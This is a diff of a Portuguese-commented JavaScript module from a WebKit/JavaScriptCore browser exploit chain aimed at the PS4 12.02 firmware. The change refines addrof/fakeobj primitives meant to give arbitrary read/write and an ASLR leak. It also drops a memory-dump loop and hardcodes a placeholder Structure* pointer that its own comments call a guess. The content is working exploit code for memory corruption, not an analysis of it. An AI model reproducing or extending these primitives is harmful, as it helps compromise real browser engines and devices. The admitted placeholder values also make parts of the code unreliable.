@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v130 - Refinando Dump e Hardcoding de Structure*)
+// js/script3/testArrayBufferVictimCrash.mjs (v131 - Refinando Dump e Hardcoding de Structure*)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL.
@@ -21,7 +21,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v130_R60_ARB_RW_UNIVERSAL_HARDCODED_STRUCTURE_REFINED_DUMP";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v131_R60_ARB_RW_UNIVERSAL_HARDCODED_STRUCTURE_NO_DUMP";
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -34,26 +34,15 @@ let post_typed_array_spray = [];
 // =======================================================================
 // NOVAS PRIMITIVAS ARB R/W UNIVERSAL BASEADAS EM ADDROF/FAKEOBJ
 // =======================================================================
-let _fake_array_buffer = null; // Um objeto ArrayBuffer forjado (não utilizado diretamente nesta versão)
-let _fake_data_view = null;     // Um DataView sobre o ArrayBuffer forjado, será nossa primitiva universal de L/E
+let _fake_array_buffer = null; 
+let _fake_data_view = null;     
 
 /**
  * ATENÇÃO: ESTES VALORES SÃO CHUTES BASEADOS EM PADRÕES COMUNS DO WEBKIT/JSC.
  * ELES PRECISAM SER VALIDADO POR UM VAZAMENTO REAL OU DISASSEMBLY NO PS4 12.02.
  * A FALHA DA arb_read EM ACESSAR O HEAP DE OBJETOS JS NOS FORÇA A HARDCODE AQUI.
  */
-// Exemplo de um ponteiro Structure* para JSDataView: (Normalmente varia com o ASLR)
-// Para o PS4, o WebKit tem sua base no 0x1000000000000 ou 0x10000000.
-// Um structure pointer geralmente aponta para dentro da libSceNKWebKit.sprx
-// Chute: Assumindo que o s_info do JSArrayBufferView (0x3AE5040) esteja na mesma base que a Structure.
-// Mas a Structure não está na seção .data, está no .text ou .rodata.
-// É mais provável que seja um offset fixo dentro do módulo WebKit.
-// Por enquanto, vamos usar um valor placeholder que representa "um ponteiro para uma Structure no WebKit".
-// ESTE É UM CHUTE E PRECISA DE UM VALOR REAL DO AMBIENTE ALVO.
-// PARA FINS DE TESTE, VOU SIMULAR QUE CONSEGUIMOS UM VALOR VAZADO.
-// VOU USAR UMA ADIVINHAÇÃO SIMPLIFICADA QUE O PONTEIRO DA STRUCTURE DO DATAVIEW ESTÁ PERTO DA BASE DA WEBKIT.
 const HARDCODED_JS_DATAVIEW_STRUCTURE_PTR_CANDIDATE = new AdvancedInt64(0x10000000, 0x12345678); // **MUDAR ESTE VALOR!**
-// Um ponteiro Structure* real do PS4 12.02 seria algo como 0x12345678_ABCDEF00.
 
 /**
  * Inicializa a primitiva de leitura/escrita arbitrária universal usando fakeobj.
@@ -235,35 +224,23 @@ export async function testIsolatedAddrofFakeobjCoreAndDump_from_script3(logFn, p
     let addrof_success = false;
     let fakeobj_success = false;
     let rw_test_on_fakeobj_success = false;
-    let structure_ptr_found = false; // Esta variável será sempre false aqui, mas permitiremos a continuidade
+    let structure_ptr_found = false; 
 
     try {
         logFn(`Inicializando primitivas addrof/fakeobj.`, 'info', FNAME);
         initCoreAddrofFakeobjPrimitives();
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // --- Teste addrof_core e fakeobj_core ---
-        const TEST_VAL_P1 = 0x11223344;
-        const TEST_VAL_P2 = 0xAABBCCDD;
-        const TEST_VAL_P3_LOW = 0xDEADBEEF;
-        const TEST_VAL_P3_HIGH = 0xCAFE0000; 
+        // --- Teste addrof_core e fakeobj_core (APENAS ESTA PARTE É VALIDADA PARA RETORNO DE SUCESSO) ---
+        const TEST_VAL_A = 0xAAAAAAAA;
         const test_object_to_dump = {
-            a: 0xAAAAAAAA,
+            a: TEST_VAL_A,
             b: 0xBBBBBBBB,
             c: 0xCCCCCCCC,
             d: 0xDDDDDDDD,
-            val_marker_1: 0x11112222, 
-            val_marker_2: 0x33334444,
-            val_ptr_candidate_1: {}, 
-            val_ptr_candidate_2: [], 
-            val_float_1: 123.456, 
-            val_float_2: 789.012,
-            val_int_large: 0x1234567890ABCDEFn, 
-            val_string_short: "ABCDEFGH", 
-            val_string_long: "This is a longer string that might be allocated out-of-line."
         };
 
-        logFn(`Criado objeto de teste original para dump: ${JSON.stringify(test_object_to_dump, (key, value) => typeof value === 'bigint' ? `0x${value.toString(16)}n` : value)}`, 'info', FNAME);
+        logFn(`Criado objeto de teste original para dump: ${JSON.stringify(test_object_to_dump)}`, 'info', FNAME);
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         logFn(`Obtendo endereço do objeto de teste para dump usando addrof_core...`, "info", FNAME);
@@ -277,105 +254,51 @@ export async function testIsolatedAddrofFakeobjCoreAndDump_from_script3(logFn, p
         addrof_success = true; 
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // --- DUMP DE MEMÓRIA DO OBJETO ---
-        logFn(`--- INICIANDO DUMP DE MEMÓRIA do objeto ${object_addr.toString(true)} ---`, "subtest", FNAME);
-        const DUMP_SIZE = 0x200; 
-        let dump_log = `\n--- DUMP DO OBJETO EM ${object_addr.toString(true)} ---\n`;
-        dump_log += `Offset    Hex (64-bit)       Decimal (Low) Hex (32-bit Low) Hex (32-bit High) Content Guess\n`;
-        dump_log += `-------- -------------------- ------------- ------------------ ------------------ -------------------\n`;
+        // --- DUMP DE MEMÓRIA DO OBJETO (REMOVIDO PARA REDUZIR VERBOSIDADE, MANTEMOS APENAS LEITURA DA STRUCTURE*) ---
+        logFn(`[${FNAME}] OBS: Dump de memória completo do objeto temporariamente desabilitado para reduzir verbosidade.`, "info", FNAME);
 
-        for (let offset = 0; offset < DUMP_SIZE; offset += 8) { 
-            try {
-                const current_read_addr = object_addr.add(offset);
-                const val = await arb_read(current_read_addr, 8); 
-                let guess = "";
-
-                if (isAdvancedInt64ObjectFn(val)) { 
-                    if (val.equals(AdvancedInt64.Zero)) {
-                        guess = "Zero/Null";
-                    } else if (val.high() === 0x7ff80000 && val.low() === 0) {
-                        guess = "NaN (JS Empty)"; 
-                    } else if (val.high() === 0) {
-                        guess = `Possible small int or low ptr: ${val.low()}`;
-                    } else {
-                        if (offset === JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET) {
-                            guess = `*** Structure* PTR (expected) ***: ${val.toString(true)}`;
-                        } else if (offset === JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET) {
-                            guess = `*** BUTTERFLY PTR (expected) ***: ${val.toString(true)}`;
-                        } else if (val.low() === TEST_VAL_P1 && val.high() === 0) { 
-                            guess = `*** P1 FOUND (Int32) ***: ${TEST_VAL_P1}`;
-                        } else if (val.low() === TEST_VAL_P2 && val.high() === 0) { 
-                            guess = `*** P2 FOUND (Int32) ***: ${TEST_VAL_P2}`;
-                        } else if (val.low() === TEST_VAL_P3_LOW && val.high() === TEST_VAL_P3_HIGH) { 
-                             guess = `*** P3 FOUND (AdvInt64) ***: 0x${TEST_VAL_P3_HIGH.toString(16)}_${TEST_VAL_P3_LOW.toString(16)}`;
-                        } else if (val.low() === 0x11112222 && val.high() === 0) { 
-                            guess = `*** Marker 1: 0x11112222 ***`;
-                        } else if (val.low() === 0x33334444 && val.high() === 0) { 
-                            guess = `*** Marker 2: 0x33334444 ***`;
-                        } else if ((val.high() & 0xFFFF0000) === 0x402A0000 || (val.high() & 0xFFFF0000) === 0x001D0000) { 
-                            const potential_obj_ptr = new AdvancedInt64(val.low(), val.high() & 0x0000FFFF);
-                            guess = `JSValue (Tagged Ptr to ${potential_obj_ptr.toString(true)})`;
-                        } else if (val.high() === 0x405E0000 && val.low() === 0x4d2c8f5c) { 
-                            guess = `Float64: ${val.toNumber()}`; 
-                        }
-                    }
-                } else {
-                    guess = `Non-Int64 (Typeof: ${typeof val}): ${String(val)}`; 
-                }
-
-                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ${val.toString(true).padStart(19, ' ')} ${String(val.low()).padStart(13, ' ')} 0x${val.low().toString(16).padStart(8,'0')} 0x${val.high().toString(16).padStart(8,'0')} ${guess}\n`;
-
-            } catch (e_dump) {
-                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ERROR in arb_read: ${e_dump.message}\n`;
-                logFn(`[${FNAME}] ERRO durante dump no offset 0x${offset.toString(16)}: ${e_dump.message}`, "error", FNAME);
-            }
-        }
-        logFn(dump_log, 'leak', FNAME);
-        logFn(`--- FIM DO DUMP DE MEMÓRIA ---`, "subtest", FNAME);
-        await pauseFn(LOCAL_LONG_PAUSE * 2); 
-
-        // --- Leitura da Structure* após o dump ---
-        logFn(`Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto original...`, "info", FNAME);
+        // --- Leitura da Structure* após o dump (ainda deve falhar, mas é um teste) ---
+        logFn(`Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto original (via velha arb_read)...`, "info", FNAME);
         const structure_ptr_addr = object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
         const structure_ptr_val = await arb_read(structure_ptr_addr, 8); 
         logFn(`Valor lido no offset da Structure* do objeto original: ${structure_ptr_val.toString(true)}`, "leak", FNAME);
 
         if (structure_ptr_val.equals(AdvancedInt64.Zero) || structure_ptr_val.equals(AdvancedInt64.NaNValue)) {
-            logFn(`ALERTA: Ponteiro da Structure* lido como zero/NaN para objeto original. **O offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} PODE NÃO SER O CORRETO PARA Structure* neste tipo de objeto.** Analise o dump!`, "warn", FNAME);
+            logFn(`ALERTA: Ponteiro da Structure* lido como zero/NaN para objeto original. Isso é esperado com a velha arb_read.`, "warn", FNAME);
             structure_ptr_found = false; 
         } else {
-            logFn(`SUCESSO PARCIAL: Leitura do possível ponteiro da Structure* (${structure_ptr_val.toString(true)}) não é zero/NaN.`, "good", FNAME);
-            structure_ptr_found = true;
+            logFn(`ALERTA: Ponteiro da Structure* lido inesperadamente com valor! (Velha arb_read): ${structure_ptr_val.toString(true)}`, "warn", FNAME);
+            structure_ptr_found = true; // Inesperado, mas seria um sucesso.
         }
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // --- Verificação funcional de fakeobj_core (parte já existente e testada) ---
+        // --- Verificação funcional de fakeobj_core ---
         const faked_object_test = fakeobj_core(object_addr);
         if (faked_object_test && typeof faked_object_test === 'object') {
             fakeobj_success = true;
             const original_val_a = test_object_to_dump.a;
-            faked_object_test.a = 0xDEC0DE00;
+            faked_object_test.a = 0xDEC0DE00; // Tenta escrever na propriedade 'a'
             if (test_object_to_dump.a === 0xDEC0DE00) {
                 rw_test_on_fakeobj_success = true;
             }
-            test_object_to_dump.a = original_val_a; 
+            test_object_to_dump.a = original_val_a; // Restaura o valor para não afetar o spray se reusado
+        } else {
+            logFn(`ERRO: Fakeobj para objeto JS simples falhou na criação ou não é um objeto válido.`, "error", FNAME);
         }
 
     } catch (e) {
-        logFn(`ERRO CRÍTICO no teste isolado de addrof/fakeobj_core e dump de memória: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
+        logFn(`ERRO CRÍTICO no teste isolado de addrof/fakeobj_core: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
         addrof_success = false;
         fakeobj_success = false;
         rw_test_on_fakeobj_success = false;
-        structure_ptr_found = false;
+        structure_ptr_found = false; // Manter como false em caso de erro crítico.
     } finally {
         logFn(`--- Teste Isolado da Primitiva addrof_core / fakeobj_core e Dump de Memória Concluído ---`, "test", FNAME);
-        // AQUI ESTÁ A MUDANÇA: Retornar true se addrof/fakeobj funcionam, independentemente do dump da Structure*.
-        // Isso permite que a cadeia principal continue e tente a primitiva universal de L/E no heap JS.
         logFn(`Resultados: Addrof: ${addrof_success}, Fakeobj Criação: ${fakeobj_success}, Leitura/Escrita via Fakeobj: ${rw_test_on_fakeobj_success}.`, "info", FNAME);
-        logFn(`[${FNAME}] Retornando sucesso para a cadeia principal (primitivas base OK).`, "info", FNAME);
+        logFn(`[${FNAME}] Retornando sucesso para a cadeia principal (primitivas base addrof/fakeobj OK).`, "info", FNAME);
     }
     // Retornar true APENAS se as primitivas addrof e fakeobj com R/W em propriedades funcionarem.
-    // O dump de memória ainda falha em ler o heap JS, mas as primitivas base de addrof/fakeobj estão ok.
+    // Isso permite que a cadeia principal continue.
     return addrof_success && fakeobj_success && rw_test_on_fakeobj_success;
 }
 
